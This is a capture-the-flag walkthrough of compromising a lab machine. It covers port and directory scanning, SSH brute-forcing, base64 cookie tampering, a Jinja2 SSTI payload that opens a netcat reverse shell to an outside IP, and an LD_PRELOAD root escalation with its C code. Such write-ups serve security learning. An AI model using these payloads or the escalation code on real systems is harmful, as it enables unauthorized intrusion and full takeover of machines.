Started initial Nmap scan:
`nmap -T4 -p- 10.10.132.245 -oN initial`

Meanwhile started gobuster scan on the default Apache webpage I found:
`gobuster dir -u http://10.10.132.245 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directories`

Did another Nmap scan for the open ports:
`nmap -sV -sC -p80,22 -oN ports 10.10.132.245`

Found possible usernames, Jed and Jad.

Attempting brute force:
`hydra -l ged -P /usr/share/wordlists/rockyou.txt 10.10.132.245 ssh`

Found a base64 data in a cookie, decoded to guest.
Changed it to YWRtaW4= (admin) and got admin access, than another cookie for sales amount showed up.

After looking at a write up found the following website:
[SSTI in Flask/Jinja2](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)

By putting the next code in the cookie decoded I got access:
`{{ ''.__class__.__mro__[1].__subclasses__()[401]('ls',shell=True,stdout=-1).communicate()}}`

Used the following code to finally get a shell:
`{{ ''.__class__.__mro__[1].__subclasses__()[401]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.31.71 1234 >/tmp/f',shell=True,stdout=-1).communicate()}}`

Upgrading the shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

By running `sudo -l` I found I have sudo permission to ps and that the LD_PRELOAD is set, so I wrote the following c code to get a root shell:

```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

I Than got the file to the victim machine using a python server and compiled it to .so file using:
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

Finally I ran the following command to preload the library and get a root shell:
`sudo LD_PRELOAD=./shell.so ps`